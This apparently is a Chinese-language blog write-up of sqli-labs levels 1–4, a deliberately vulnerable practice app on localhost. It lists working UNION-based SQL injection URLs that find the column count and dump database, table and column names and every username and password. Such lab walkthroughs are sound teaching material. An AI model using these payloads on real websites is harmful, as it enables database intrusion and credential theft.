---
title: sqlilabs union联合查询注入
author: Troyee
avatar: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20160708223941_YQncj.jpeg
authorLink: 
authorAbout: 
authorDesc: 
categories: 技术
comments: true
date: 2020-03-15 19:21:48
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/timg.jfif
---
Less-1
注：-- 在sql中表示注释，但是在url中发送请求时会把最后的空格去掉，所以这里用--+（+号会被转换为空格）来表示注释。
在1后面加上’发现报错，推测这里存在注入点
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200315192921.png)
从错误信息中我们可以知道是单引号的匹配出了问题，也就是说我们添加的单引号成功被数据库解析，那么我们就可以通过闭合这个id这个参数，然后插入自己构造的sql语句实施攻击。
接着用order by 语句判断表中一共有几列数据：
http://localhost/sqli-labs-php7-master/Less-1/?id=1’order by 3--+
当order by 4时报错，说明一共有三列。
接着要确定有哪几列会显示出来：
http://localhost/sqli-labs-php7-master/Less-1/?id=111’ union select 1,2,3 --+
发现页面输出了2和3，说明有两个显示位。
然后就利用sql语句爆破出数据库名，表名，列名，字段信息。

爆库：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%20--+

查询security内的所有表名：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27--+

爆user表的列：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--+

爆所有的用户名和密码：http://localhost/sqli-labs-php7-master/Less-1/?id=111%27%20union select 1,group_concat(username),group_concat(password) from users --+
Less-2根据报错语句可知此处是数字型注入。用和第一关相同的方式成功绕过。
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200315192930.png)
Less-3：由报错信息可得后台查询语句应为select * from * where id = ('$id') LIMIT 0,1
后面查询语句同上
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ截图20200315193300.png)
Less-4:当输入id=1”时报错，根据错误信息可判断查询语句是id=(“$id”)，后面同上。

